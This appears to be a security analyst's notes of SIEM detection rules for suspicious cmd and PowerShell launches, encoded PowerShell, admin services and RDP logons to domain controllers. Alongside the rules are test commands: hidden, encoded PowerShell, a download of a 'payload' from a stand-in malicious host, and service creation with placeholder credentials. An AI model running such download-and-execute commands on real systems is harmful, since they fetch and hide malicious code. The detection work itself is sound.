suspect parent process of cmd and powershell - blacklist- process Events:

process contains "cmd.exe", "powershell.exe" && process.src contains "winword.exe", "excel.exe", "powerpnt.exe", "mspub.exe", "visio.exe", "outlook.exe", "java", "lsass.exe", "csrss.exe", "epad.exe", "regsvr32.exe", "dllhost.exe", "LogonUI.exe", "wermgr.exe", "spoolsv.exe", "jucheck.exe", "jusched.exe", "ctfmon.exe", "taskhostw.exe", "GoogleUpdate.exe", "sppsvc.exe", "sihost.exe", "slui.exe", "SIHClient.exe", "SearchIndexer.exe", "SearchProtocolHost.exe", "FlashPlayerUpdateService.exe", "WerFault.exe", "WUDFHost.exe", "unsecapp.exe", "wlanext.exe"


suspect parent process of powershell - whitelis - process Events:

process contains "powershell.exe" AND process.src != "c:\\windows\\explorer.exe" AND process.src exists AND process.src != "C:\\Windows\\System32\\svchost.exe" AND process.src != "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe" AND process.src != "C:\\Windows\\System32\\cmd.exe" AND process.src != "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"

Suspected Powershell Commands - blacklist - Powershell Events:


reference.id = "800" AND param contains " -NoP ", " -W Hidden ", " -e* JAB", " -e* SUVYI", " -e* SQBFAFgA", " -e* aWV4I", " -e* IAB", " -e* PAA", " -e* aQBlAHgA", ".downloadstring", ".downloadfile", ";iex"


A service running with admin privilege:
reference.id = '4688' && process.src contains 'c:\windows\system32\services.exe' && user.dst contains 'admin'

Connection to DC without passing by console:

device.class = 'Windows Hosts' && reference.id = '4624' && logon.type = '10' && ip.src != 10.51.116.38,39,3,10.61.119.20 && device.host contains 'dc'



schtasks /create /tn "LaunchCmdTest" /tr "cmd.exe" /sc once /st 00:00
schtasks /run /tn "LaunchCmdTest"



cmd.exe (Command Prompt) and powershell.exe (PowerShell) are legitimate system utilities but are often exploited by attackers to execute scripts or commands. These processes may have a malicious parent process (e.g., a suspicious executable or script) initiating them.


index=windows AND source="WinEventLog:Security" AND EventCode=4688 AND parent_process_name IN ( "winword.exe", "excel.exe", "powerpnt.exe", "mspub.exe", "visio.exe", "outlook.exe", "java", "lsass.exe", "csrss.exe", "epad.exe", "regsvr32.exe", "dllhost.exe", "LogonUI.exe", "wermgr.exe", "spoolsv.exe", "jucheck.exe", "jusched.exe", "ctfmon.exe", "taskhostw.exe", "GoogleUpdate.exe", "sppsvc.exe", "sihost.exe", "slui.exe", "SIHClient.exe", "SearchIndexer.exe", "SearchProtocolHost.exe", "FlashPlayerUpdateService.exe", "WerFault.exe", "WUDFHost.exe", "unsecapp.exe", "wlanext.exe", "wordpad.exe") AND new_process_name IN ("cmd.exe","powershell.exe")

| eval severity = "High" 
| rename dvc_nt_host AS dvc 
| table parent_process_name new_process_name user severity



PowerShell (powershell.exe) is a legitimate system administration tool, but it is often exploited by attackers for malicious purposes. A whitelist approach helps identify deviations from expected behavior by focusing on legitimate parent processes that should typically invoke PowerShell


index=windows AND source="WinEventLog:Security" AND EventCode=4688 AND new_process_name="powershell.exe" AND NOT parent_process_name  IN ("explorer.exe","svchost.exe","WmiPrvSE.exe","cmd.exe","powershell.exe","QualysAgent.exe")
| eval severity = "High" 
| rename dvc_nt_host AS dvc 
| table dvc user parent_process_name new_process_name severity


powershell.exe -WindowStyle Hidden -Command "Write-Output 'Simulating hidden window'"
powershell.exe -EncodedCommand SQBFAFgA
Invoke-WebRequest -Uri "http://malicious-example.com/payload" -OutFile "C:\Users\Public\malware.exe"

# Encoded command example
$encodedCommand = "JABFAFgAIAAtTm9QIC1XIEhpZGRlbiAtZQAgJABJAGUAeABQAA=="
powershell.exe -NoP -W Hidden -EncodedCommand $encodedCommand


The technique "Suspected PowerShell Commands - Blacklist - PowerShell Events" typically refers to detecting potentially malicious PowerShell activities by monitoring and blacklisting specific commands, scripts, or keywords in PowerShell logs. These events are identified through PowerShell



index=windows AND source="WinEventLog:Microsoft-Windows-PowerShell/Operational"  AND EventCode=4104 AND ( " -NoP "OR "*-W Hidden*" OR "*-e* JAB*" OR "*-e* SUVYI*" OR "*-e* SQBFAFgA*" OR "*-e* aWV4I*" OR "*-e* IAB*" OR "*-e* PAA*" OR "*-e* aQBlAHgA*" OR "*.downloadstring*" OR "*.downloadfile*" OR "*;iex*")
| eval severity = "High"
| rename dvc_nt_host AS dvc, UserID AS user


sc create AdminService binPath= "cmd.exe /k" start= demand obj= "DOMAIN\AdminUser" password= "AdminPassword"

This technique involves leveraging a service or process that is running with administrative privileges on a system


index=windows AND source="WinEventLog:Security" AND  EventCode=4688 AND  parent_process_name="services.exe" AND user="*admin*"
| eval severity = "Medium" 
| rename dvc_nt_host AS dvc 
| table dvc user parent_process_name severity


Connection to DC without passing by console
Detect and alert when a user establishes a connection to a Domain Controller (DC) without utilizing the console (e.g., via remote desktop or other non-console methods). This ensures compliance with security policies restricting non-console administrative access to sensitive systems.


index=windows AND source="XmlWinEventLog:Security" AND EventCode=4624 AND Logon_Type=10 AND host=*dc* AND NOT src_ip IN ("10.51.116.38","10.51.116.39","10.51.116.3")
| eval severity = "Medium" 
| rename dvc_nt_host AS dvc
| table dvc user src_ip dvc severity

